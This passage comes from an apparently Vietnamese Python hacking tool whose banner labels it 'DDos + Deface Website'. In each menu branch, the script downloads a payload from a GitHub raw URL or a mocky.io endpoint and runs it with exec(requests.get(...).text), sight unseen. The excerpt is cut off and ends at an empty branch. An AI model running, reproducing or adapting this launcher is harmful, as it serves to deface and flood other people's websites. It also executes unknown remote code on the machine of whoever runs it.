...
\033[1;34m└═════════════════════════════════════════════════════════════════════════════┘
\033[1;34m ➯ Loại Tool: \033[1;37mDDos + Deface Website
\033[1;34m└═════════════════════════════════════════════════════════════════════════════┘
...
if chon == 1 :
	exec(requests.get('https://raw.githubusercontent.com/NamHoang1301/hnamtermuxtool/main/deface.py').text)
elif chon == 2 :
	exec(requests.get('https://run.mocky.io/v3/c4454542-4fd5-4c88-a31a-36c57f1aab09').text)
elif chon == 3 :
	exec(requests.get('https://run.mocky.io/v3/6c49dd57-f3c6-4e2a-b6d5-7aac1e7db97e').text)
elif chon == 4 :
	exec(requests.get('https://run.mocky.io/v3/861a3d71-9a35-4a6a-8bb7-2aba5ad2b45c').text)
elif chon == 0 :
